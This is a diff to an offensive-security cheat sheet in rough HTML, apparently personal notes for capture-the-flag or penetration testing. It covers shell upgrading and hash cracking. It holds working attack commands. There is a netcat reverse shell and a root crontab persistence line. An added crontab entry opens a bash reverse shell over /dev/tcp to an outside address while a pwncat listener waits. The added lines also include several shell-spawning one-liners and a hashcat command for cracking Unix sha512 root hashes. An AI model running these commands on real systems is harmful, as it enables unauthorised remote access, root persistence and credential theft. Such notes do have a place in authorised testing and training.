@@ -255,11 +255,39 @@ sudo nc -e /bin/sh $RHOST $RPORT
 add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c /bin/bash' >> /etc/crontab</code>
 
 
-<h1>SPAWN BASH SHELL</h1>
+<h1>Spawn TTY shell / Stablelize your Shell</h1>
 
 <b>From rbash to bash</b> <code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>
 
-<b>From sh to bash</b<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>
+<b>From crontab to bash</b>
+
+example 1.
+
+First start listner<code>pwncat -l -p 5555<code>
+
+then <code>echo ' * * * * * bash -i >& /dev/tcp/10.0.10.10/5555 0>&1' >> /etc/crontab</code>
+
+Then you just have to look and wait in your lister terminal for 1 min.
+
+
+<
+
+<code>python -c 'import pty; pty.spawn("/bin/sh")'</code>
+
+<code>echo os.system('/bin/bash')</code>
+
+<code>/bin/sh -i</code>
+
+<code>perl —e 'exec "/bin/sh";'</code>
+
+<code>perl: exec "/bin/sh";</code>
+
+<code>ruby: exec "/bin/sh"</code>
+
+<code>lua: os.execute('/bin/sh')</code>
+
+<h1>Stabalize your shell</h1>
+
 
 
 
@@ -287,5 +315,6 @@ Crack Hash
 
 <code>john -- wordlist=superlist.lst --format=gpg wordlisthash-from-file</code>
 
+<b>Crack sha512 (deafult unix root hash)</b>
 
-
+<code>hashcat -m 1800 -a 0 -o hash-found.txt userhash.txt /opt/wordlists/rockyou.txt</code>
